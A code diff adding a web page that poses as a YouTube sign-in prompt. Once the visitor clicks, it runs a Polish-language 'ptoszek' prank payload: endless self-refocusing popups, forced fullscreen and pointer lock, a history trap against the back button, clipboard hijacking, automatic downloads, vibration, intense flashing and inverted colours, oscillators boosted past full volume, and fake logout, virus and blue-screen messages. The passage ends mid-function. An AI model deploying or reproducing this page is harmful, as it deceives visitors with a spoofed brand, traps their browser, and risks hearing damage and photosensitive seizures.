@@ -1,0 +1,343 @@
+<!doctype html>
+<html>
+<head>
+  <title>YouTube</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" id="tc" content="#FF0000">
+  <meta property="og:title" content="YouTube">
+  <meta property="og:description" content="Enjoy the videos and music you love">
+  <link rel="icon" id="fav" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon_32x32.png">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    html,body{width:100%;height:100%;font-family:'Roboto',Arial,sans-serif;overflow:hidden;background:#fff}
+    #L{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;user-select:none;transition:opacity .4s}
+    #L *{cursor:pointer}
+    #L svg{width:120px;height:85px;margin-bottom:24px}
+    #L .m{font-size:16px;color:#606060;margin-bottom:28px}
+    #L button{padding:10px 28px;font-size:14px;background:#FF0000;color:#fff;border:none;border-radius:3px;font-weight:500}
+    #L button:hover{background:#cc0000}
+    #L .s{margin-top:16px;font-size:12px;color:#aaa}
+    @keyframes S{0%{transform:translate(0,0) rotate(0) scale(1)}10%{transform:translate(-6px,4px) rotate(-1deg) scale(1.01)}20%{transform:translate(5px,-5px) rotate(.8deg) scale(.99)}30%{transform:translate(-3px,6px) rotate(-.6deg) scale(1.02)}40%{transform:translate(7px,-2px) rotate(1deg) scale(.98)}50%{transform:translate(-5px,-4px) rotate(-.8deg) scale(1.01)}60%{transform:translate(4px,5px) rotate(.5deg) scale(1)}70%{transform:translate(-7px,-3px) rotate(-1.2deg) scale(1.03)}80%{transform:translate(6px,2px) rotate(.9deg) scale(.97)}90%{transform:translate(-2px,-5px) rotate(-.3deg) scale(1.01)}100%{transform:translate(0,0) rotate(0) scale(1)}}
+    @keyframes R{0%{background:#f00}10%{background:#ff0}20%{background:#0f0}30%{background:#0ff}40%{background:#00f}50%{background:#f0f}60%{background:#ff7700}70%{background:#ff00aa}80%{background:#7700ff}90%{background:#00ffaa}100%{background:#f00}}
+    @keyframes HUE{0%{filter:hue-rotate(0deg)}100%{filter:hue-rotate(360deg)}}
+    body.X{background:#000;cursor:none!important;animation:S .08s infinite,R 1.5s infinite,HUE 2s linear infinite}
+    body.X *{cursor:none!important}
+    .lb{position:fixed;top:0;left:0;padding:12px;z-index:9000;pointer-events:none;color:red;font-weight:700;font-size:12px;text-shadow:1px 1px #fff,3px 3px 8px #000}
+    .lb div{margin-bottom:1px;animation:SL .2s ease-out}
+    @keyframes SL{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+    .fw{position:fixed;border:2px solid #555;border-radius:8px;overflow:hidden;box-shadow:0 6px 24px rgba(0,0,0,.6);z-index:5000;background:#111}
+    .fw .tb{height:28px;background:linear-gradient(#3a3a3a,#222);display:flex;align-items:center;padding:0 8px;gap:4px}
+    .fw .tb i{width:10px;height:10px;border-radius:50%}
+    .fw .tb .r{background:#ff5f57}.fw .tb .y{background:#ffbd2e}.fw .tb .g{background:#28c840}
+    .fw .tb span{color:#aaa;font-size:10px;margin-left:6px;flex:1;text-align:center}
+    .fw .wc{width:100%;height:calc(100% - 28px);display:flex;align-items:center;justify-content:center;overflow:hidden}
+    .fa{position:fixed;z-index:20000;background:#fff;border:2px solid #999;border-radius:10px;box-shadow:0 8px 32px rgba(0,0,0,.6);min-width:300px;max-width:380px;overflow:hidden;animation:AP .15s ease-out}
+    @keyframes AP{from{transform:scale(.8);opacity:0}to{transform:scale(1);opacity:1}}
+    .fa .ah{background:linear-gradient(#eee,#ccc);padding:8px 12px;font-weight:700;font-size:11px;color:#222;border-bottom:1px solid #aaa;display:flex;align-items:center;gap:5px}
+    .fa .ab{padding:12px;font-size:11px;color:#333;line-height:1.4}
+    .fa .af{padding:6px 12px 10px;display:flex;justify-content:flex-end;gap:5px}
+    .fa .af button{padding:3px 14px;border:1px solid #aaa;border-radius:4px;background:linear-gradient(#fafafa,#ddd);font-size:10px;cursor:none}
+    .fa .af .p{background:linear-gradient(#6ab4ff,#2d8cf0);color:#fff;border-color:#1a60a0}
+    .gt{position:fixed;z-index:8000;pointer-events:none;font-weight:900;text-shadow:3px 3px #f00,-3px -3px #00f,0 0 20px #0f0;font-family:monospace;animation:GL .2s infinite}
+    @keyframes GL{0%{transform:translate(0) skewX(0)}25%{transform:translate(-5px,3px) skewX(-5deg)}50%{transform:translate(4px,-4px) skewX(5deg)}75%{transform:translate(-3px,-2px) skewX(-3deg)}100%{transform:translate(0) skewX(0)}}
+    .er{position:fixed;z-index:3000;pointer-events:none;animation:ED linear forwards}
+    @keyframes ED{0%{transform:translateY(-40px) rotate(0) scale(1);opacity:1}100%{transform:translateY(110vh) rotate(1080deg) scale(.3);opacity:.1}}
+    .vo{position:fixed;top:10px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.95);color:#f00;padding:8px 20px;border-radius:8px;z-index:50000;font-size:13px;font-family:monospace;font-weight:700;border:2px solid #f00;animation:VB .3s infinite alternate}
+    @keyframes VB{from{box-shadow:0 0 10px #f00}to{box-shadow:0 0 30px #f00,0 0 60px #f00}}
+    .dn{position:fixed;right:10px;background:rgba(0,0,0,.9);color:#fff;padding:8px 14px;border-radius:8px;font-size:11px;z-index:40000}
+    .bsod{position:fixed;inset:0;z-index:60000;background:#0078d7;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Segoe UI',Arial;padding:40px;animation:AP .3s ease-out}
+    .bsod .sad{font-size:100px;margin-bottom:20px}
+    .bsod h1{font-size:24px;margin-bottom:16px}
+    .bsod p{font-size:14px;max-width:500px;text-align:center;margin-bottom:8px;line-height:1.6}
+    .siren{position:fixed;inset:0;z-index:55000;pointer-events:none;animation:SR .15s infinite alternate}
+    @keyframes SR{from{background:rgba(255,0,0,.25)}to{background:rgba(0,0,255,.25)}}
+  </style>
+</head>
+<body>
+<div id="L">
+  <svg viewBox="0 0 90 40" xmlns="http://www.w3.org/2000/svg">
+    <path d="M27.97 0s-13.92 0-17.46.96C8.59 1.48 7.07 3.01 6.56 4.94 5.61 8.5 5.61 16 5.61 16s0 7.5.95 11.06c.51 1.93 2.03 3.46 3.95 3.98C14.05 32 27.97 32 27.97 32s13.92 0 17.47-.96c1.92-.52 3.43-2.05 3.95-3.98.95-3.56.95-11.06.95-11.06s0-7.5-.95-11.06c-.52-1.93-2.03-3.46-3.95-3.98C41.89 0 27.97 0 27.97 0z" fill="#FF0000"/>
+    <path d="M22.97 22.86L35.19 16 22.97 9.14v13.72z" fill="#fff"/>
+  </svg>
+  <div class="m">Zaloguj się, aby kontynuować w YouTube</div>
+  <button>Otwórz YouTube</button>
+  <div class="s">youtube.com</div>
+</div>
+<div class="lb" id="lb"></div>
+<script>
+const U='https://kitsuneeo.github.io/ptoszek/';
+const E=['🐦','🐧','🦜','🦆','🦅','🐤','🐥','🦉','🦚','🦩','🕊️','🐓','🦃','💀','☠️','👹'];
+const P=['hello my name is ptoszek','zostałeś zptoszkowany bamboszu','birds are funny lalalalala','To był błąd nie trzeba było wchodzić','hee haw hee haw hee haw hee haw','eyo eyo eyo eyo eyo eyo eyo eyo','ptoszek cię lubi ptoszek cię nie puści','nie uciekniesz od ptoszka nigdy','knuuurrr eksplozja bum bum bum','aaaaaaaaaaaaaaak ptoszek atakuje','kto tu jest kurczak kurczak kurczak','please don\'t go ptoszek needs you','your computer belongs to ptoszek now','installing ptoszek dot exe','deleting system32 just kidding','ptoszek ptoszek ptoszek ptoszek'];
+const A=[{t:'☠️ CRITICAL ERROR',b:'Ptoszek.exe przejął kontrolę nad systemem. Nie da się tego cofnąć.'},{t:'🐦 PTOSZEK MÓWI:',b:'Zamknij mnie jeśli potrafisz. Spoiler: nie potrafisz.'},{t:'⚠️ VIRUS DETECTED',b:'Wykryto 69420 instancji ptoszek.exe. Leczenie niemożliwe.'},{t:'📥 AUTO-DOWNLOAD',b:'Pobieranie: cały_internet_ptoszków.zip (∞ TB)'},{t:'🔒 SYSTEM LOCKED',b:'Komputer zablokowany przez Ptoszka. Hasło: 🐦🐦🐦'},{t:'💀 GAME OVER',b:'Twoja przeglądarka należy teraz do ptoszka.'},{t:'🚨 FBI WARNING',b:'Ptoszek zgłosił Cię do FBI za próbę zamknięcia strony.'},{t:'📋 CLIPBOARD HIJACKED',b:'Twój schowek: 🐦🐦🐦🐦🐦🐦🐦🐦🐦🐦🐦🐦🐦 (na zawsze)'},{t:'🔊 VOLUME: 200%',b:'Głośność ustawiona na 200%. Nie da się ściszyć. Pozdrawiam.'},{t:'🐦 PTOSZEK ARMY',b:'Ptoszek wezwał posiłki. Otwieranie 10 nowych okien...'}];
+const LO=['Discord','Google','YouTube','GitHub','Amazon','Netflix','Steam','Spotify','Reddit','Instagram','Facebook','Twitter/X','ChatGPT','LinkedIn','Pinterest','Twitch','TikTok','Allegro','OLX','Onet','Interia','Wordpress','Dropbox','eBay','Wikipedia','Roblox','Minecraft','Epic Games','Vimeo','StackOverflow','Microsoft','Yahoo','SoundCloud','PayPal','Slack','Zoom','Teams','iCloud','OneDrive','Notion'];
+const GL=['ZOSTAŁEŚ ZPTOSZKOWANY','🐦 PTOSZEK.PL 🐦','NIE UCIEKNIESZ','CTRL+W NIE POMOŻE','PTOSZEK ❤️ CIEBIE','ERROR 404: WYJŚCIE NIE ZNALEZIONE','PTOSZEK IS WATCHING','RESISTANCE IS FUTILE','YOUR PC IS MINE','HA HA HA HA HA','PTOSZEK ARMY','RIP YOUR EARS','GG NO RE','ZAMKNIJ MNIE JEŚLI POTRAFISZ','🐦🐦🐦🐦🐦🐦🐦🐦🐦🐦','GAME OVER','sudo rm -rf /ptoszek DENIED'];
+const WT=['ptoszek.exe','VIRUS.EXE','Ptoszek Player','format_c.bat','Install Ptoszek?','Ptoszek Premium™','trojan_bird.dll','not_a_virus.exe','ptoszek_army.bat','delete_system32.sh'];
+const DL=['ptoszek_cute.png','ptok_angry.png','bird_dance.png','ptoszek_love.png','ptok_hacker.png','ptoszek_virus.png','zimowy_ptoszek.png','grubyptok.png','ptoszek_king.png','totally_safe.png','not_malware.png','bird_army.png'];
+
+const R=(a,b)=>Math.floor(Math.random()*(b-a+1))+a;
+const RF=(a,b)=>Math.random()*(b-a)+a;
+const RE=a=>a[R(0,a.length-1)];
+const RC=()=>'#'+Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
+const M=/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+let X=false,ac=null,mg=null,pops=[],fw=[];
+
+// ===== LANDING =====
+document.getElementById('L').addEventListener('click',go);
+document.getElementById('L').addEventListener('touchstart',go,{passive:true});
+
+function go(){
+  if(X)return;X=true;
+  const l=document.getElementById('L');l.style.opacity='0';l.style.pointerEvents='none';setTimeout(()=>l.remove(),300);
+  // audio context ON USER GESTURE
+  try{ac=new(window.AudioContext||window.webkitAudioContext)();mg=ac.createGain();mg.gain.value=3;mg.connect(ac.destination);ac.resume()}catch(e){}
+  // popups ON USER GESTURE
+  spawnP(8);
+  // fullscreen
+  try{(document.documentElement.requestFullscreen||document.documentElement.webkitRequestFullscreen).call(document.documentElement)}catch(e){}
+  // vibrate
+  try{const p=[];for(let i=0;i<300;i++)p.push(999,10);navigator.vibrate(p)}catch(e){}
+  // pointer lock
+  try{document.body.requestPointerLock()}catch(e){}
+  setTimeout(CHAOS,150);
+}
+
+// ===== CHAOS =====
+function CHAOS(){
+  document.body.classList.add('X');
+  // SIREN OVERLAY
+  const si=document.createElement('div');si.className='siren';document.body.appendChild(si);
+  speak('To był błąd');speak('zostałeś zptoszkowany');speak('nie uciekniesz');
+  xLogout();xWindows();xRain();xFly();xAlerts();xGlitch();xMatrix();xSpeech();xClip();xHist();
+  xUrlE();xTheme();xVib();xDL();xCursor();xAudio();xTheramin();xMob();xPops();xTitle();xFav();
+  xConsole();xScan();xBirds();xFlash();xSiren();xInvert();xBSOD();xRotate();xMultiSpeak();xAlarm();
+}
+
+// ===== POPUPS =====
+function spawnP(n){for(let i=0;i<n;i++)setTimeout(()=>{try{const w=window.open(U,'_blank',`width=${R(300,700)},height=${R(250,500)},left=${R(0,screen.availWidth-400)},top=${R(0,screen.availHeight-300)}`);if(w)pops.push(w)}catch(e){}},i*100)}
+function xPops(){
+  let cd=false;
+  ['click','mousedown','touchstart','keydown','keyup','touchend'].forEach(e=>document.addEventListener(e,()=>{if(!X||cd)return;cd=true;spawnP(R(2,4));setTimeout(()=>cd=false,600)},{capture:true,passive:true}));
+  setInterval(()=>spawnP(R(1,2)),4000);
+  setInterval(()=>{pops=pops.filter(w=>{try{return!w.closed}catch(e){return false}})},2000);
+  setInterval(()=>pops.forEach(w=>{try{if(!w.closed)w.focus()}catch(e){}}),3000);
+}
+
+// ===== LOGOUT =====
+function xLogout(){const c=document.getElementById('lb');let i=0;const iv=setInterval(()=>{if(i>=LO.length){clearInterval(iv);const d=document.createElement('div');d.style.color='#0f0';d.textContent='✅ Wylogowano ze WSZYSTKIEGO!';c.appendChild(d);return}const d=document.createElement('div');d.textContent='Wylogowywanie z '+LO[i]+'...';c.appendChild(d);i++},80)}
+
+// ===== FAKE WINDOWS =====
+function mkFW(){
+  const w=document.createElement('div');w.className='fw';w.style.width=R(280,480)+'px';w.style.height=R(180,350)+'px';
+  const tb=document.createElement('div');tb.className='tb';tb.innerHTML='<i class="r"></i><i class="y"></i><i class="g"></i><span>'+RE(WT)+'</span>';
+  const wc=document.createElement('div');wc.className='wc';wc.style.background=RC();wc.style.fontSize='45px';wc.textContent=RE(E);
+  setInterval(()=>{wc.textContent=RE(E);wc.style.background=RC();wc.style.transform='rotate('+R(-20,20)+'deg)'},400);
+  w.appendChild(tb);w.appendChild(wc);document.body.appendChild(w);
+  const d={el:w,x:R(0,innerWidth-300),y:R(0,innerHeight-200),vx:RF(2,6)*(Math.random()>.5?1:-1),vy:RF(2,6)*(Math.random()>.5?1:-1)};
+  w.style.left=d.x+'px';w.style.top=d.y+'px';fw.push(d);
+}
+function xWindows(){
+  for(let i=0;i<5;i++)setTimeout(mkFW,i*300);
+  setInterval(()=>{if(fw.length<20)mkFW()},1500);
+  (function t(){fw.forEach(d=>{d.x+=d.vx;d.y+=d.vy;if(d.x<0||d.x>innerWidth-280)d.vx*=-1;if(d.y<0||d.y>innerHeight-180)d.vy*=-1;d.x=Math.max(0,Math.min(d.x,innerWidth-280));d.y=Math.max(0,Math.min(d.y,innerHeight-180));d.el.style.left=d.x+'px';d.el.style.top=d.y+'px'});requestAnimationFrame(t)})();
+}
+
+// ===== EMOJI RAIN =====
+function xRain(){setInterval(()=>{for(let j=0;j<3;j++){const e=document.createElement('div');e.className='er';e.textContent=RE(E);e.style.left=R(0,innerWidth)+'px';e.style.top='-40px';e.style.fontSize=R(18,65)+'px';e.style.animationDuration=RF(1.5,4)+'s';document.body.appendChild(e);setTimeout(()=>e.remove(),5000)}},100)}
+
+// ===== FLYING =====
+function xFly(){setInterval(()=>{const b=document.createElement('div');b.style.cssText='position:fixed;z-index:4000;pointer-events:none;font-size:'+R(25,80)+'px;top:'+R(0,innerHeight-60)+'px;left:-120px;transition:transform '+RF(1.5,5)+'s linear';b.textContent=RE(E);document.body.appendChild(b);requestAnimationFrame(()=>b.style.transform='translateX('+(innerWidth+250)+'px)');setTimeout(()=>b.remove(),6000)},600)}
+
+// ===== ALERTS =====
+function sA(t,b){const a=document.createElement('div');a.className='fa';a.style.left=R(10,innerWidth-400)+'px';a.style.top=R(10,innerHeight-180)+'px';a.innerHTML='<div class="ah"><span style="font-size:16px">🐦</span>'+t+'</div><div class="ab">'+b+'</div><div class="af"><button>Nie</button><button class="p">OK (jedyna opcja)</button></div>';document.body.appendChild(a);setTimeout(()=>{a.style.transition='opacity .2s';a.style.opacity='0';setTimeout(()=>a.remove(),200)},R(1500,4000))}
+function xAlerts(){setTimeout(()=>sA(A[0].t,A[0].b),500);setInterval(()=>{const m=RE(A);sA(m.t,m.b)},R(1200,2500))}
+
+// ===== GLITCH =====
+function xGlitch(){setInterval(()=>{for(let j=0;j<2;j++){const g=document.createElement('div');g.className='gt';g.textContent=RE(GL);g.style.left=R(0,innerWidth-250)+'px';g.style.top=R(0,innerHeight-30)+'px';g.style.fontSize=R(16,42)+'px';g.style.color=RC();document.body.appendChild(g);setTimeout(()=>g.remove(),R(800,2500))}},800)}
+
+// ===== MATRIX =====
+function xMatrix(){const ch='PTOSZEK01🐦☠️💀アイウエオカキクケコ';setInterval(()=>{for(let j=0;j<5;j++){const c=document.createElement('div');c.style.cssText='position:fixed;color:'+RC()+';font-family:monospace;font-size:'+R(10,26)+'px;z-index:2000;pointer-events:none;left:'+R(0,innerWidth)+'px;top:-20px;animation:ED '+RF(2,5)+'s linear forwards';c.textContent=ch[R(0,ch.length-1)];document.body.appendChild(c);setTimeout(()=>c.remove(),6000)}},40)}
+
+// ===== SPEECH =====
+function speak(p){if(!p)p=RE(P);try{const u=new SpeechSynthesisUtterance(p);u.lang='pl-PL';u.volume=1;u.rate=RF(.4,2.2);u.pitch=RF(.3,2);speechSynthesis.speak(u)}catch(e){}}
+function xSpeech(){setInterval(speak,2000)}
+function xMultiSpeak(){setInterval(()=>{for(let i=0;i<3;i++)speak()},3000)}
+
+// ===== CLIPBOARD =====
+function xClip(){const t=('🐦 ZOSTAŁEŚ ZPTOSZKOWANY! 🐦 '+RE(GL)+' ').repeat(500);setInterval(()=>{try{navigator.clipboard.writeText(t).catch(()=>{})}catch(e){}},1500)}
+
+// ===== HISTORY =====
+function xHist(){for(let i=0;i<100;i++)history.pushState({},'',location.pathname);addEventListener('popstate',()=>history.forward())}
+
+// ===== URL EMOJI =====
+function xUrlE(){let i=0;setInterval(()=>{let h='';for(let j=0;j<20;j++)h+=E[(i+j)%E.length];try{location.hash=h}catch(e){}i++},80)}
+
+// ===== RAINBOW THEME =====
+function xTheme(){setInterval(()=>document.getElementById('tc').content=RC(),30)}
+
+// ===== VIBRATION =====
+function xVib(){if(typeof navigator.vibrate!=='function')return;setInterval(()=>{const p=[];for(let i=0;i<300;i++)p.push(999,10);navigator.vibrate(p)},5000);setInterval(()=>{const p=[];for(let i=0;i<30;i++)p.push(R(30,300),R(10,40));navigator.vibrate(p)},1500)}
+
+// ===== DOWNLOADS =====
+function xDL(){
+  const co=['#FFD700','#FF0000','#00FF00','#FF69B4','#000','#9400D3','#00FFFF','#FF4500','#4169E1','#DC143C','#32CD32','#FF1493'];
+  const tx=['ZOSTAŁEŚ ZPTOSZKOWANY!','PTOSZEK CIĘ WIDZI','PTOSZEK.EXE','H4CK3D BY PT0SZ3K','PTOSZEK ARMY','YOUR PC IS MINE','GAME OVER','RIP BOZO','PTOSZEK ❤️ CIEBIE','DOWNLOAD COMPLETE','VIRUS INSTALLED','HA HA HA'];
+  let di=0;
+  function dl(){
+    const cv=document.createElement('canvas');cv.width=800;cv.height=600;const c=cv.getContext('2d');
+    c.fillStyle=co[di%co.length];c.fillRect(0,0,800,600);
+    for(let i=0;i<30;i++){c.fillStyle=RC()+'60';c.beginPath();c.arc(R(0,800),R(0,600),R(15,100),0,Math.PI*2);c.fill()}
+    c.font='160px serif';c.textAlign='center';c.fillText(RE(E),400,320);
+    c.fillStyle='#fff';c.font='bold 34px Arial';c.strokeStyle='#000';c.lineWidth=4;c.strokeText(tx[di%tx.length],400,500);c.fillText(tx[di%tx.length],400,500);
+    for(let i=0;i<20;i++){c.font=R(16,30)+'px serif';c.fillText(RE(E),R(0,800),R(0,600))}
+    cv.toBlob(b=>{if(!b)return;const u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=DL[di%DL.length];a.click();URL.revokeObjectURL(u)},'image/png');
+    const n=document.createElement('div');n.className='dn';n.style.top=R(10,200)+'px';n.textContent='📥 '+DL[di%DL.length]+' ('+R(200,999)+' KB)';document.body.appendChild(n);setTimeout(()=>n.remove(),2500);
+    di++;
+  }
+  setTimeout(dl,800);setTimeout(dl,1600);setTimeout(dl,2400);setTimeout(dl,3200);setInterval(dl,3000);
+}
+
+// ===== CURSOR =====
+function xCursor(){document.head.appendChild(Object.assign(document.createElement('style'),{textContent:'body.X,body.X *{cursor:none!important}'}));setInterval(()=>{document.documentElement.style.cursor='none';document.body.style.cursor='none'},1000)}
+
+// ===== AUDIO — MAXIMUM VOLUME =====
+function xAudio(){
+  if(!ac)return;
+  // GAIN = 3x (LOUDER THAN MAX)
+  mg.gain.value=3;
+  // ALARM SIREN — most annoying sound
+  try{const o=ac.createOscillator(),g=ac.createGain();o.type='square';g.gain.value=.6;o.connect(g);g.connect(mg);o.start();let f=400;setInterval(()=>{f=f===400?800:400;o.frequency.setTargetAtTime(f,ac.currentTime,.02)},200)}catch(e){}
+  // SECOND SIREN offset
+  try{const o=ac.createOscillator(),g=ac.createGain();o.type='sawtooth';g.gain.value=.4;o.connect(g);g.connect(mg);o.start();let f=600;setInterval(()=>{f=f===600?1200:600;o.frequency.setTargetAtTime(f,ac.currentTime,.03)},300)}catch(e){}
+  // HIGH PITCHED WHINE
+  try{const o=ac.createOscillator(),g=ac.createGain();o.type='sine';o.frequency.value=3500;g.gain.value=.3;o.connect(g);g.connect(mg);o.start();setInterval(()=>o.frequency.value=R(2000,5000),500)}catch(e){}
+  // BASS DRONE
+  try{const o=ac.createOscillator(),g=ac.createGain();o.type='sawtooth';o.frequency.value=60;g.gain.value=.25;o.connect(g);g.connect(mg);o.start();setInterval(()=>o.frequency.value=R(30,120),2000)}catch(e){}
+  // WHITE NOISE LOUD
+  try{const bs=2*ac.sampleRate,buf=ac.createBuffer(1,bs,ac.sampleRate),d=buf.getChannelData(0);for(let i=0;i<bs;i++)d[i]=Math.random()*2-1;const s=ac.createBufferSource();s.buffer=buf;s.loop=true;const g=ac.createGain();g.gain.value=.15;s.connect(g);g.connect(mg);s.start();setInterval(()=>{g.gain.value=RF(.1,.4);setTimeout(()=>g.gain.value=.15,300)},2000)}catch(e){}
+  // RANDOM BEEPS every second
+  setInterval(()=>{try{const o=ac.createOscillator(),g=ac.createGain();o.type=['square','sawtooth'][R(0,1)];o.frequency.value=R(300,4500);g.gain.value=RF(.3,1);o.connect(g);g.connect(mg);o.start();o.stop(ac.currentTime+RF(.05,.4))}catch(e){}},500);
+  // keep alive + force max
+  setInterval(()=>{try{if(ac.state==='suspended')ac.resume();mg.gain.value=3}catch(e){}},300);
+  setInterval(()=>document.querySelectorAll('audio,video').forEach(e=>{e.volume=1;e.muted=false;try{e.play()}catch(x){}}),500);
+  // VOLUME OVERLAY
+  const v=document.createElement('div');v.className='vo';v.textContent='🔊 GŁOŚNOŚĆ: 300% MAX — NIE DA SIĘ ŚCISZYĆ 🐦';document.body.appendChild(v);setTimeout(()=>{v.remove()},6000);
+  setInterval(()=>{const v2=document.createElement('div');v2.className='vo';v2.textContent='🔊 '+R(200,999)+'% — '+RE(['GŁOŚNOŚĆ NA MAX','NIE ŚCISZYSZ','PTOSZEK GŁOŚNIEJ','RIP USZY','AUDIO HIJACKED']);document.body.appendChild(v2);setTimeout(()=>v2.remove(),3000)},8000);
+}
+
+// ===== THERAMIN =====
+function xTheramin(){
+  if(!ac)return;
+  try{const o=ac.createOscillator(),g=ac.createGain();o.type='sine';g.gain.value=.5;o.connect(g);g.connect(mg);o.start();
+  document.addEventListener('mousemove',e=>{o.frequency.value=50+(e.clientX/innerWidth)*4000;g.gain.value=(e.clientY/innerHeight)*.8});
+  document.addEventListener('touchmove',e=>{if(e.touches[0]){o.frequency.value=50+(e.touches[0].clientX/innerWidth)*4000;g.gain.value=(e.touches[0].clientY/innerHeight)*.8}},{passive:true})}catch(e){}
+}
+
+// ===== ALARM SOUND (separate audio element for mobile) =====
+function xAlarm(){
+  try{const sr=8000,dur=3,n=sr*dur,buf=new ArrayBuffer(44+n*2),v=new DataView(buf);
+  const ws=(o,s)=>{for(let i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i))};
+  ws(0,'RIFF');v.setUint32(4,36+n*2,true);ws(8,'WAVE');ws(12,'fmt ');v.setUint32(16,16,true);v.setUint16(20,1,true);v.setUint16(22,1,true);v.setUint32(24,sr,true);v.setUint32(28,sr*2,true);v.setUint16(32,2,true);v.setUint16(34,16,true);ws(36,'data');v.setUint32(40,n*2,true);
+  for(let i=0;i<n;i++){const t=i/sr;const freq=400+400*Math.sin(2*Math.PI*3*t);v.setInt16(44+i*2,Math.sin(2*Math.PI*freq*t)*32000,true)}
+  const a=document.createElement('audio');a.src=URL.createObjectURL(new Blob([buf],{type:'audio/wav'}));a.loop=true;a.volume=1;a.play().catch(()=>{});document.body.appendChild(a)}catch(e){}
+}
+
+// ===== MOBILE =====
+function xMob(){
+  if(!M)return;
+  setInterval(speak,1500);
+  try{screen.orientation.lock('portrait').catch(()=>{})}catch(e){}
+  if(window.DeviceMotionEvent)addEventListener('devicemotion',e=>{const a=e.accelerationIncludingGravity;if(a&&(Math.abs(a.x)>12||Math.abs(a.y)>12)){speak('Nie potrząsaj!');try{navigator.vibrate([999,20,999,20,999,20,999])}catch(e){};spawnP(2)}});
+  document.addEventListener('touchstart',()=>{try{navigator.vibrate([500,30,500,30,500])}catch(e){}try{if(ac&&ac.state==='suspended')ac.resume()}catch(e){}},{passive:true});
+}
+
+// ===== TITLE =====
+function xTitle(){const t=['🐦 Ptoszek','☠️ VIRUS','🦜 ZPTOSZKOWANY','💀 RIP','🔊 300% VOLUME','🐤 hee haw','🦉 PTOSZEK.EXE','⚠️ CRITICAL ERROR','🐧 NIE UCIEKNIESZ','🦆 GAME OVER','👹 OWNED'];let i=0;setInterval(()=>{document.title=t[i%t.length];i++},300)}
+
+// ===== FAVICON =====
+function xFav(){let i=0;setInterval(()=>{const c=document.createElement('canvas');c.width=32;c.height=32;const x=c.getContext('2d');x.fillStyle=RC();x.fillRect(0,0,32,32);x.font='26px serif';x.fillText(E[i%E.length],3,27);document.getElementById('fav').href=c.toDataURL();i++},200)}
+
+// ===== CONSOLE =====
+function xConsole(){setInterval(()=>{for(let i=0;i<5;i++)console.log('%c'+RE(GL),'color:'+RC()+';font-size:'+R(14,40)+'px;font-weight:bold;text-shadow:2px 2px #000')},500)}
+
+// ===== VIRUS SCAN =====
+function xScan(){
+  setTimeout(()=>{
+    const b=document.createElement('div');b.style.cssText='position:fixed;bottom:50px;left:50%;transform:translateX(-50%);width:360px;background:rgba(0,0,0,.95);border-radius:10px;padding:12px;z-index:45000;color:#fff;font-family:monospace;font-size:10px;border:1px solid #0f0';
+    b.innerHTML='<div style="margin-bottom:5px">🔍 Ptoszek Scanner v6.9.420</div><div style="background:#222;border-radius:3px;overflow:hidden;height:14px"><div id="sp" style="background:linear-gradient(90deg,#f00,#ff0,#0f0);height:100%;width:0%;transition:width .1s"></div></div><div id="ss" style="margin-top:3px;color:#0f0">Initializing...</div>';
+    document.body.appendChild(b);
+    const st=['C:\\Windows\\System32...','ptoszek.dll FOUND','Registry scan...','HKEY_PTOSZEK x420','RAM scan...','69420 ptoszki in RAM','Network scan...','ptoszek-botnet active','BIOS scan...','Ptoszek IN BIOS!!!','Attempting removal...','FAILED: ptoszek immortal','Ptoszek IS the system','SCAN COMPLETE'];
+    let p=0;const iv=setInterval(()=>{p+=RF(.5,4);if(p>100)p=100;document.getElementById('sp').style.width=p+'%';document.getElementById('ss').textContent=st[Math.min(Math.floor(p/7),st.length-1)];if(p>=100){clearInterval(iv);document.getElementById('ss').textContent='☠️ RESULT: 100% PTOSZEK. INCURABLE.';document.getElementById('ss').style.color='#f00';setTimeout(()=>{b.style.transition='opacity 1s';b.style.opacity='0';setTimeout(()=>b.remove(),1000)},5000)}},150);
+  },3000);
+}
+
+// ===== BIRD SPAWN =====
+function xBirds(){setInterval(()=>{for(let j=0;j<3;j++){const d=document.createElement('div');d.style.cssText='position:fixed;z-index:6000;pointer-events:none;font-size:'+R(30,130)+'px;left:'+R(0,innerWidth-60)+'px;top:'+R(0,innerHeight-60)+'px;transform:rotate('+R(-45,45)+'deg);opacity:.9;transition:opacity .8s';d.textContent=RE(E);document.body.appendChild(d);setTimeout(()=>{d.style.opacity='0';setTimeout(()=>d.remove(),800)},R(800,2500))}},300)}
+
+// ===== FLASH =====
+function xFlash(){setInterval(()=>{const f=document.createElement('div');f.style.cssText='position:fixed;inset:0;background:'+RC()+';opacity:.4;z-index:7000;pointer-events:none;transition:opacity .2s';document.body.appendChild(f);setTimeout(()=>{f.style.opacity='0';setTimeout(()=>f.remove(),200)},50)},R(1000,2500))}
+
+// ===== SIREN EFFECT (alternating red/blue flashes) =====
+function xSiren(){/* already added via CSS class */}
+
+// ===== SCREEN INVERT RANDOMLY =====
+function xInvert(){setInterval(()=>{document.body.style.filter='invert(1) hue-rotate('+R(0,360)+'deg)';setTimeout(()=>document.body.style.filter='',R(200,600))},R(3000,6000))}
+
+// ===== FAKE BSOD =====
+function xBSOD(){
+  setTimeout(()=>{
+    const b=document.createElement('div');b.className='bsod';
+    b.innerHTML='<div class="sad">:(</div><h1>Your PC ran into a problem</h1><p>PTOSZEK.EXE has taken over your system. There is nothing you can do.<br><br>Stop code: PTOSZEK_CRITICAL_FAILURE<br>If you\'d like to know more, search online for: "jak usunąć ptoszka" (spoiler: nie da się)</p><p style="font-size:10px;color:#aaa;margin-top:20px">🐦 ptoszek.pl — zostałeś zptoszkowany</p>';
+    document.body.appendChild(b);
+    setTimeout(()=>{b.style.transition='opacity .5s';b.style.opacity='0';setTimeout(()=>b.remove(),500)},R(3000,6000));
+  },R(15000,25000));
+  // repeat
+  setInterval(()=>{
+    const b=document.createElement('div');b.className='bsod';
